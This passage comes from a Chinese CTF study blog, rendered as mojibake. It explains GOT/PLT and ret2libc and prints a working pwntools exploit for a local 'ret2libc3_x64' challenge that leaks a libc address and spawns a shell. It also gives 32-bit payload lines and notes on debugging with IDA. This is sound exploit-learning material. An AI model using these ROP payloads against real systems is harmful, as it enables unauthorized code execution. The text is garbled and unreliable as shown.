ç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™ï¼ˆåœ¨FULL RELROä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™ï¼‰ï¼›PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„å…¥å£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™ã€‚ å°½ç®¡ libc çš„åŠ è½½åœ°å€æ˜¯éšæœºçš„ï¼ˆASLRï¼‰ï¼Œä½†åœ¨libcä¸åŒçš„æƒ…å†µä¸‹ libc å†…éƒ¨æ‰€æœ‰å‡½æ•°ç›¸å¯¹äº libc åŸºåœ°å€çš„åç§»é‡æ˜¯å›ºå®šä¸å˜çš„ã€‚è¿™æ˜¯ ret2libc æ”»å‡»çš„åŸºç¡€ã€‚ å®é™…åœ°å€&#x3D;åŸºå€+åç§» å½“ä½ å†™äº†ä¸€ä¸ªç¨‹åºä½¿ç”¨äº† libc ä¸­çš„å‡½æ•°ï¼ˆå¦‚ printfï¼‰ï¼Œè¿™ä¸ªå‡½æ•°çš„å…·ä½“åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯æœªçŸ¥çš„ï¼Œå› ä¸º libc è¢«åŠ è½½çš„ä½ç½®ä¼šå›  ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰è€Œå˜åŒ–ã€‚ å‡½æ•°åç§° å†…å®¹ PLT æä¾›è·³è½¬æ¡©ä»£ç  GOT å­˜æ”¾å®é™…å‡½æ•°åœ°å€ å½“ä½ çš„ç¨‹åºè°ƒç”¨ printf() æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ PLT ä¸­çš„ printf@pltï¼ŒPLT å†é€šè¿‡ GOT æŸ¥æ‰¾çœŸæ­£çš„åœ°å€ã€‚ ğŸ” æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰ ä¸ºä»€ä¹ˆå¯ä»¥ç”¨ system@pltï¼Ÿ å› ä¸ºå®ƒæ˜¯ libc ä¸­system()å‡½æ•°çš„â€œå…¥å£å¤§é—¨â€ï¼Œè¿›å»ä»¥åå°±ä¼šè‡ªåŠ¨è·³è¿‡å»ï¼Œä¸ç”¨ä½ è‡ªå·±å»æ‰¾è·¯ã€‚ ä¸ºä»€ä¹ˆä¸ç”¨ GOTï¼Ÿ å› ä¸ºæˆ‘ä»¬ä¸æ˜¯è¦è¯»å–åœ°å€ï¼Œè€Œæ˜¯è¦è°ƒç”¨å‡½æ•°ã€‚PLT å°±åƒæŒ‰é’®ï¼ŒæŒ‰ä¸‹å»å°±èƒ½è¿è¡Œå‡½æ•°ï¼Œä¸éœ€è¦å…ˆçœ‹åœ°å€ã€‚ ä»€ä¹ˆæ—¶å€™å¿…é¡»ç”¨ GOTï¼Ÿ å½“ä½ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸çŸ¥é“ libc ç‰ˆæœ¬å’Œåœ°å€æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ GOT æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ‰èƒ½è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„åœ°å€ã€‚ ä»€ä¹ˆæ—¶å€™èƒ½ç›´æ¥ç”¨ PLTï¼Ÿ å½“ä½ åœ¨æœ¬åœ°è°ƒè¯•ã€libc æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”ç¨‹åºæ²¡å¼€ PIEï¼ˆåœ°å€ä¸éšæœºåŒ–ï¼‰çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ PLTã€‚ ret2libc3 å¯ä»¥ç”¨ ret2syscall çš„æ–¹æ³•æ¥æ”»å‡»ï¼Œåªéœ€è¦æ‰¾åˆ°ç‰¹å®šçš„ã€å›ºå®šçš„ ROP gadgets å’Œ int 0x80 æŒ‡ä»¤ã€‚ é€‰æ‹© ret2libc çš„æ–¹æ³•ï¼Œé€šå¸¸æ˜¯å› ä¸º system() å‡½æ•°æä¾›çš„ä¾¿æ·æ€§æ›´é«˜ï¼Œè™½ç„¶å¤šäº†ä¸€æ­¥ libc æ³„éœ²çš„å¼€é”€ï¼Œä½†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ›´â€œç®€å•â€ä¸”æ›´â€œé€šç”¨â€ã€‚ åœ¨å®é™…çš„ CTF æ¯”èµ›ä¸­ï¼Œæ”»å‡»è€…ä¼šæ ¹æ®ç›®æ ‡ç¨‹åºçš„å…·ä½“æƒ…å†µï¼ˆæ˜¯å¦æœ‰æ˜“äºåˆ©ç”¨çš„ int 0x80ã€æ˜¯å¦æœ‰è¶³å¤Ÿçš„ gadgetsã€æ˜¯å¦æœ‰ &quot;/bin/sh&quot; å­—ç¬¦ä¸²ç­‰ï¼‰æ¥é€‰æ‹©æœ€ç®€å•ã€æœ€å¯é çš„æ”»å‡»æ–¹æ³•ã€‚ ret2libc3 ä¹‹æ‰€ä»¥éœ€è¦æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºè°ƒç”¨ libc åº“ä¸­ï¼ˆè€Œéç¨‹åºè‡ªèº«ï¼‰çš„å°è£…å‡½æ•°ï¼ˆå¦‚ system()ï¼‰ï¼Œè€Œè¿™äº› libc å‡½æ•°çš„åœ°å€ä¼šå—åˆ° ASLR (åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–) çš„å½±å“è€ŒéšæœºåŒ–ã€‚ret2syscall èƒ½å¤Ÿä¸æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºç¨‹åºè‡ªèº«æˆ–åŠ è½½åˆ°å›ºå®šåœ°å€çš„å…±äº«åº“ä¸­çš„ ROP gadget å’Œ int 0x80 æŒ‡ä»¤ï¼Œè¿™äº›åœ°å€åœ¨æ²¡æœ‰ PIE (ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶) çš„æƒ…å†µä¸‹æ˜¯å›ºå®šçš„ã€‚ ret2libc3_x6432ä½ç¨‹åºçš„payloadéƒ½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹ååŠ ä¸Šå‚æ•°ï¼Œè€Œ64ä½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹å‰æŠŠå‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­ 64ä½ç¨‹åºå’Œ32ä½ç¨‹åºçš„ROPæŠ€æœ¯çš„ä¸åŒç‚¹åœ¨äºå‚æ•°ä¼ é€’çš„æ–¹å¼ä¸åŒã€‚64ä½ç¨‹åºçš„å‰6ä¸ªå‚æ•°æ˜¯rdi,rsi,rdx,rcx,r8,r9ï¼Œåç»­å‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥64ä½ç¨‹åºçš„ROPå’Œret2syscallå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å…ˆæ§åˆ¶å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°è¿›è¡Œæ“ä½œã€‚ è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== ä¿®æ”¹å¼€å§‹ï¼šæ·»åŠ  GDB åŠ¨æ€ä¸‹æ–­ç‚¹ ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;) # åœ¨ system åœ°å€å¤„ä¸‹æ–­ç‚¹# ====== ä¿®æ”¹ç»“æŸ ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive() å¯¹äºpayload2ç”±äºè€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸¤ä¸ªretæŒ‡ä»¤æ”¾åœ¨ä¸€èµ· payload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget) å †æ ˆå¹³è¡¡64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰ï¼Œæ ˆæŒ‡é’ˆï¼ˆrspï¼‰å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ 32ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰åï¼Œæ ˆæŒ‡é’ˆ esp çš„å€¼åº”è¯¥ä¿æŒä¸å˜ï¼ˆ32ä½ä¸€èˆ¬ä¸è€ƒè™‘å †æ ˆå¹³è¡¡ï¼‰ âœ… ä¸€ã€é™æ€åˆ†æï¼šè®¡ç®—æ ˆåç§» ä¸ºäº†æ ˆå¯¹é½ï¼ˆé¿å…å´©æºƒï¼‰ï¼Œä½ æ„é€ çš„ payload ä¸­â€œé™¤äº†å¡«å……éƒ¨åˆ†â€ä¹‹å¤–çš„å†…å®¹ï¼ˆå³ gadget å’Œå‚æ•°ï¼‰æœ€å¥½æ˜¯ä¸€ä¸ªå¶æ•°å—ï¼ˆ8 å­—èŠ‚ä¸ºä¸€å—ï¼‰ âœ… äºŒã€åŠ¨æ€è°ƒè¯•ï¼šä½¿ç”¨ GDB æŸ¥çœ‹ rsp çš„å€¼ å¯¹äºè¿™ä¸€é¢˜æ¥è¯´ï¼Œåœ¨ç¡®å®šäº†libc.soåº“å’ŒlibcåŸºå€ä¹‹åï¼Œåœ¨systemå‡½æ•°å†…åœ¨systemå¤„è®¾ç½®æ–­ç‚¹ ä¹‹åè¿è¡Œè¿™ä¸ªè„šæœ¬ è¿™é‡Œå°±é€‰æ‹©å¥½libcç‰ˆæœ¬äº† ä¹‹ååŠ¨æ€è°ƒè¯•æŸ¥çœ‹ åœ¨åˆšè¿›å…¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€æ­¥ï¼Œå°±å·²ç»å¤„äºä¸å¹³è¡¡çš„çŠ¶æ€äº† å› ä¸ºå®ƒåœ¨è°ƒç”¨å‰æ˜¯æ ˆå¹³è¡¡ï¼Œè°ƒç”¨æ—¶ä¼šæœ‰push rsp æŒ‡ä»¤æ”¹å˜ æŸ¥çœ‹æ ˆé¡¶çš„å‘½ä»¤æ˜¯ 1info register rsp æ³¨æ„å¯¹äºæ„é€ çš„ropé“¾ å¡«å……è¿”å›åœ°å€ å¡«å……çš„è¿”å›åœ°å€ æ•ˆæœ main() è®©ç¨‹åºé‡æ–°è¿è¡Œ main å‡½æ•°ï¼ˆå¯é‡å¤åˆ©ç”¨ï¼‰ _start é‡æ–°å¼€å§‹æ•´ä¸ªç¨‹åº shellcode åœ°å€ å¦‚æœä½ æƒ³ç»§ç»­æ‰§è¡Œè‡ªå·±çš„ä»£ç  exit()æˆ–_exit() å®‰å…¨é€€å‡ºç¨‹åº è¿”å›åœ°å€å†™0çš„æ—¶å€™å¶å°”ä¼šæŠ¥é”™ è¿”å›åœ°å€å¤„ç†ğŸ¯ 2. 32 ä½ vs 64 ä½åœ°å€ é¡¹ç›® 32 ä½ 64 ä½ åœ°å€é•¿åº¦ï¼ˆä½ï¼‰ 32 ä½ &#x3D; 4 å­—èŠ‚ 64 ä½ &#x3D; 8 å­—èŠ‚ Python é‡Œçš„è¡¨ç¤º 0xdeadbeef 0x7fffdeadbeef æ‰“åŒ…å‡½æ•° p32() p64() è§£åŒ…å‡½æ•° u32() u64() 32ä½æ¥æ”¶ 12leak = p.recv(4) # 32ä½æ³„éœ²ä¸€èˆ¬æ˜¯4å­—èŠ‚addr = u32(leak) # è½¬æˆ int 64ä½æ¥æ”¶ 12leak = p.recv(6) # é€šå¸¸èƒ½æ”¶åˆ°6å­—èŠ‚ï¼Œæœ‰æ—¶å€™é«˜ä¸¤å­—èŠ‚æ˜¯0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;)) # è¡¥æˆ8å­—èŠ‚å†è§£åŒ… ljust(length, fillchar) ä¼šå°†å½“å‰çš„å­—èŠ‚ä¸² leak å·¦å¯¹é½åˆ°æŒ‡å®šçš„ lengthï¼ˆè¿™é‡Œæ˜¯ 8 å­—èŠ‚ï¼‰ï¼Œå¹¶ä½¿ç”¨ fillcharï¼ˆè¿™é‡Œæ˜¯ b&#39;\\x00&#39;ï¼Œå³ç©ºå­—èŠ‚ï¼‰ä»å³ä¾§è¿›è¡Œå¡«å……ã€‚ æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°1payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr) 1. åˆå§‹çŠ¶æ€ï¼ˆæ‰§è¡Œ ret å‰ï¼‰ å‡è®¾æ­¤æ—¶æ ˆå¸ƒå±€å¦‚ä¸‹ï¼ˆæ ¹æ®ä½ çš„ payloadï¼‰ï¼š python 1payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh) æ ˆå†…å­˜å¸ƒå±€ï¼š text 123esp -&gt; 0x80484d0 ï¼ˆè¦†ç›–çš„è¿”å›åœ°å€ï¼ŒæŒ‡å‘ system@pltï¼‰esp + 4 -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot; çš„åœ°å€ï¼‰ å¯„å­˜å™¨çŠ¶æ€ï¼š eipï¼šæŒ‡å‘ GetFlag+90 çš„ ret æŒ‡ä»¤ã€‚ espï¼šæŒ‡å‘æ ˆé¡¶ 0x80484d0ã€‚ 2. æ‰§è¡Œ ret æŒ‡ä»¤ ret ç­‰ä»·äº pop eipï¼Œå…·ä½“æ“ä½œï¼š ä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€åˆ° eipï¼š eip = [esp] â†’ eip = 0x80484d0ï¼ˆè·³è½¬åˆ° system@pltï¼‰ã€‚ esp = esp + 4 â†’ æ ˆæŒ‡é’ˆä¸Šå‡ 4 å­—èŠ‚ã€‚ æ ˆå˜åŒ–ï¼š text 12esp -&gt; 0x08048722 ï¼ˆåŸ esp + 4ï¼‰esp + 4 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ 3. è¿›å…¥ system@plt åçš„æµç¨‹ (1) é¦–æ¬¡è°ƒç”¨ system@pltï¼ˆGOT æœªè§£æï¼‰ system@plt çš„ä»£ç ï¼š asm 1230x80484d0 &lt;system@plt&gt; jmp [0x804a024] ; è·³è½¬åˆ° GOT è¡¨ï¼ˆé¦–æ¬¡æŒ‡å‘ä¸‹ä¸€è¡Œï¼‰0x80484d6 &lt;system@plt+6&gt; push 0x30 ; é‡å®šä½åç§»0x80484db &lt;system@plt+11&gt; jmp 0x8048460 ; è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ jmp [0x804a024]ï¼š é¦–æ¬¡è°ƒç”¨æ—¶ï¼ŒGOT è¡¨ 0x804a024 ä¸­çš„å€¼ä¸º 0x80484d6ï¼ˆå³ system@plt+6ï¼‰ï¼Œå› æ­¤ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ push 0x30ï¼š esp = esp - 4 â†’ æ ˆæŒ‡é’ˆä¸‹é™ 4 å­—èŠ‚ã€‚ [esp] = 0x30 â†’ å°† 0x30 å‹æ ˆã€‚ æ ˆå˜åŒ–ï¼š text 123esp -&gt; 0x30 ï¼ˆæ–°å‹å…¥çš„å€¼ï¼‰esp + 4 -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ jmp 0x8048460ï¼š è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ï¼ˆ_dl_runtime_resolveï¼‰ï¼Œè§£æ system çš„çœŸå®åœ°å€å¹¶æ›´æ–° GOT è¡¨ã€‚ *(2) åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆå åŠ¨æ€é“¾æ¥å™¨ä¼šå°† system çš„çœŸå®åœ°å€å†™å…¥ GOT è¡¨ 0x804a024ã€‚ åç»­è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚ 4. æ‰§è¡Œ system å‡½æ•°æ—¶ (1) system çš„è°ƒç”¨çº¦å®šï¼ˆcdeclï¼‰ å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼š call system ä¼šéšå¼å‹å…¥è¿”å›åœ°å€ï¼ˆä½†ä½ çš„æ¼æ´åˆ©ç”¨ç›´æ¥è·³è½¬åˆ° system@pltï¼Œæœªé€šè¿‡ callï¼‰ã€‚ å‚æ•°ä½äº esp + 4ï¼ˆå› ä¸º esp æŒ‡å‘è¿”å›åœ°å€ï¼‰ã€‚ ä½ çš„åœºæ™¯ï¼š åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆåï¼Œç›´æ¥è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚ æ­¤æ—¶æ ˆå¸ƒå±€ï¼š text 12esp -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 4 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ system ä¼šä» esp + 4 è¯»å–å‚æ•°ï¼ˆå³ 0x080482eaï¼‰ï¼Œæ‰§è¡Œ system(&quot;sh&quot;)ã€‚ (2) system æ‰§è¡Œåçš„æ ˆå¹³è¡¡ å¦‚æœæ˜¯æ­£å¸¸ call systemï¼Œè°ƒç”¨è€…éœ€é€šè¿‡ add esp, 4 æ¸…ç†å‚æ•°ã€‚ ä½†ä½ çš„æ¼æ´åˆ©ç”¨ä¸­ï¼š é€šè¿‡ ret è·³è½¬åˆ° system@pltï¼Œæœªæ˜¾å¼ä½¿ç”¨ callã€‚ system æ‰§è¡Œå®Œæ¯•åä¼šè¿”å›åˆ° 0x08048722ï¼ˆä¼ªé€ çš„åœ°å€ï¼‰ã€‚ 5. å…¨ç¨‹ esp å˜åŒ–æ€»ç»“ æ­¥éª¤ esp å˜åŒ– æ ˆå¸ƒå±€ï¼ˆæ ˆé¡¶å‘ä¸‹ï¼‰ æ‰§è¡Œ ret å‰ esp â†’ 0x80484d0 [0x80484d0, 0x08048722, 0x080482ea] æ‰§è¡Œ ret esp += 4 â†’ 0x08048722 [0x08048722, 0x080482ea] system@plt ä¸­ push 0x30 esp -= 4 â†’ 0x30 [0x30, 0x08048722, 0x080482ea] åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆ esp æ¢å¤ä¸º 0x08048722 [0x08048722, 0x080482ea] system è¯»å–å‚æ•° ä» esp + 4 è¯»å– 0x080482ea å‚æ•° &quot;sh&quot; è¢«æ­£ç¡®ä¼ é€’ 6. å…³é”®ç»“è®º ret ç›´æ¥ä¿®æ”¹ eip å’Œ espï¼š é€šè¿‡å¼¹å‡ºè¿”å›åœ°å€å®ç°æ§åˆ¶æµåŠ«æŒï¼Œesp ä¼š +4ã€‚ system çš„å‚æ•°ä¼ é€’ä¾èµ–æ ˆå¸ƒå±€ï¼š ç¡®ä¿ ret åï¼Œesp + 4 æŒ‡å‘å‚æ•°åœ°å€ï¼ˆä½ çš„ payload å·²æ»¡è¶³ï¼‰ã€‚ åŠ¨æ€é“¾æ¥çš„é¢å¤–æ ˆæ“ä½œï¼š é¦–æ¬¡è°ƒç”¨ PLT æ—¶ä¼šæœ‰ push 0x30ï¼Œesp ä¼š -4ï¼Œä½†æœ€ç»ˆä¸å½±å“å‚æ•°ä½ç½®ã€‚ é€šè¿‡æ§åˆ¶ ret åçš„æ ˆå¸ƒå±€ï¼Œä½ æˆåŠŸå°† &quot;sh&quot; ä¼ é€’ç»™ systemï¼Œæœ€ç»ˆè·å– shellã€‚","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"idaä½¿ç”¨+åŠ¨è°ƒ","slug":"idaä½¿ç”¨-åŠ¨è°ƒ","date":"2025-03-19T11:50:43.000Z","updated":"2025-07-14T07:30:59.888Z","comments":true,"path":"2025/03/19/idaä½¿ç”¨-åŠ¨è°ƒ/","permalink":"http://example.com/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","excerpt":"","text":"idaåŠ¨æ€è°ƒè¯•æ–­ç‚¹ä¸€èˆ¬æ‰“çš„éƒ½æ˜¯è½¯ä»¶æ–­ç‚¹ ç¡¬ä»¶æ–­ç‚¹çš„è®¾æ³•ï¼šæ‰“å¥½æ–­ç‚¹å æ‰“å¼€æ‰¾åˆ°åˆšæ‰æ‰“ä¸‹çš„æ–­ç‚¹åå³é”®Editç¼–è¾‘å‹¾é€‰Hardware å·®åˆ«ï¼š 1. å®ç°åŸç†ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹æ˜¯é€šè¿‡ä¿®æ”¹ç¨‹åºæŒ‡ä»¤æ¥å®ç°çš„ã€‚åœ¨ä»£ç ä¸­æ’å…¥ä¸€ä¸ªç‰¹å®šçš„ä¸­æ–­æŒ‡ä»¤ï¼ˆä¾‹å¦‚ï¼Œåœ¨x86æ¶æ„ä¸­æ˜¯INT 3æŒ‡ä»¤ï¼‰ã€‚ è°ƒè¯•å™¨ä¼šè®°å½•è¢«æ›¿æ¢çš„åŸå§‹æŒ‡ä»¤ï¼Œå¹¶åœ¨ç¨‹åºç»§ç»­æ‰§è¡Œæ—¶æ¢å¤å®ƒã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹ä¸éœ€è¦ä¿®æ”¹ç¨‹åºä»£ç ã€‚ 2. èµ„æºé™åˆ¶ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹åœ¨æ•°é‡ä¸Šæ²¡æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼Œå¯ä»¥åœ¨ç¨‹åºä¸­çš„ä»»æ„ä½ç½®è®¾ç½®ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š CPUæä¾›çš„ç¡¬ä»¶æ–­ç‚¹å¯„å­˜å™¨æ•°é‡æœ‰é™ï¼Œå› æ­¤å¯ä»¥åŒæ—¶è®¾ç½®çš„ç¡¬ä»¶æ–­ç‚¹æ•°é‡ä¹Ÿæœ‰é™ã€‚ï¼ˆæœ€å¤šå››ä¸ªï¼‰ 3. ä½¿ç”¨åœºæ™¯ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹é€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦è®¾ç½®å¤§é‡æ–­ç‚¹æ—¶ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š è°ƒè¯•æ— æ³•ä¿®æ”¹ä»£ç çš„ç¨‹åºï¼Œä¾‹å¦‚åªè¯»å†…å­˜ä¸­çš„ä»£ç ã€‚ è°ƒè¯•éœ€è¦ç²¾ç¡®æ§åˆ¶æ‰§è¡Œæµç¨‹çš„ç¨‹åºï¼Œä¾‹å¦‚å†…æ ¸ä»£ç æˆ–é©±åŠ¨ç¨‹åºã€‚ è°ƒè¯•æ•°æ®æ–­ç‚¹ï¼Œå°±æ˜¯å½“æŸä¸ªå†…å­˜åœ°å€è¢«è¯»å–æˆ–è€…å†™å…¥çš„æ—¶å€™å‡ºå‘æ–­ç‚¹ï¼Œè¿™æ˜¯ç¡¬ä»¶æ–­ç‚¹ç‰¹æœ‰çš„åŠŸèƒ½ã€‚ 4. éšè”½æ€§ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å¯èƒ½ä¼šè¢«ä¸€äº›åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹ä¸ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å…·æœ‰æ›´é«˜çš„éšè”½æ€§ã€‚ æ€»ç»“ï¼š è½¯ä»¶æ–­ç‚¹çµæ´»æ–¹ä¾¿ï¼Œé€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œä½†å¯èƒ½ä¼šè¢«åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚ ç¡¬ä»¶æ–­ç‚¹éšè”½æ€§é«˜ï¼Œé€‚ç”¨äºç‰¹æ®Šè°ƒè¯•åœºæ™¯ï¼Œä½†æ•°é‡æœ‰é™ æ¡ä»¶æ–­ç‚¹ æ¡ä»¶æ–­ç‚¹æ˜¯ä¸€ç§åœ¨è°ƒè¯•å™¨ä¸­è®¾ç½®çš„æ–­ç‚¹ï¼Œå®ƒä»…åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰ä¼šè§¦å‘ã€‚åœ¨æ¡†ä½ç½®è¾“å…¥æ¡ä»¶ æ›´æ”¹å­—èŠ‚é€‰ä¸­è¦æ›´æ”¹çš„é‚£ä¸ªå­—èŠ‚ å³é”® æ›´æ”¹ä¹‹åApply patch to åº”ç”¨è¿™ä¸ªè¡¥ä¸ [FlareOn6]Overlong elfæ–‡ä»¶åŠ¨æ€è°ƒè¯•1.æ‰¾åˆ°idaçš„æ ¹ç›®å½•ï¼Œæ‰¾åˆ°dbgsrvæ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­æ‰¾åˆ° æ ¹æ®elfæ–‡ä»¶çš„è¿›åˆ¶é€‰æ‹©ï¼ˆä»¥64è¿›åˆ¶å’Œsnake.elfä¸ºä¾‹ï¼‰ å°†linux server64å’Œsnakeæ‹–å…¥æ–‡ä»¶å¤¹ä¸­ ä¹‹ååœ¨è™šæ‹Ÿæœºç»ˆç«¯å†…è¾“å‡ºchmod +x linux_server64èµ‹äºˆæ–‡ä»¶æ‰§è¡Œæƒåˆ© ä¹‹åè¾“å…¥./linux_server64è¿è¡Œæ–‡ä»¶ï¼ˆä¹‹åç­‰å¾…ä¸»æœºè¿æ¥ï¼‰ å†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ip addrè·å–è™šæ‹Ÿæœºipåœ°å€ æ£€æµ‹æ˜¯å¦å¯ä»¥æˆåŠŸï¼š æ‰“å¼€ä¸»æœºç»ˆç«¯è¾“å…¥ ping +è™šæ‹Ÿæœºip(ä¸‹å›¾å³ä¸ºæ¥è¿æ¥æˆåŠŸ) ä¹‹åæ‰“å¼€Debugger&gt;Process options&gt; 1:å¡«snakeåœ¨è™šæ‹Ÿæœºä¸­çš„ä½ç½® 2ï¼šå¡«snakeåœ¨è™šæ‹Ÿæœºæ‰€åœ¨æ–‡ä»¶çš„æ–‡ä»¶ä½ç½® 3ï¼šå¡«è™šæ‹Ÿæœºip 4:è¿è¡Œ.&#x2F;linux_server64åï¼Œè¾“å‡ºListening on 0.0.0.0:23946ï¼ˆä¸€èˆ¬é»˜è®¤ï¼‰ ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œï¼ˆä¸‹æ¬¡è¿è¡Œæ—¶åœ¨æ­¤è¿è¡Œ.&#x2F;linux_server64ï¼Œå¹¶æŠŠæ–‡ä»¶æ‹–å…¥æƒ³ç›¸åŒç›®å½•å³å¯ï¼‰ æ˜¾ç¤ºæ‰€æœ‰æœºå™¨ç ï¼šâ€‹ Options&gt;general&gt;æ”¹ä¸º10 x64dbgF2ï¼šè®¾ç½®æ–­ç‚¹ã€‚ï¼‰F4ï¼šè¿è¡Œåˆ°å…‰æ 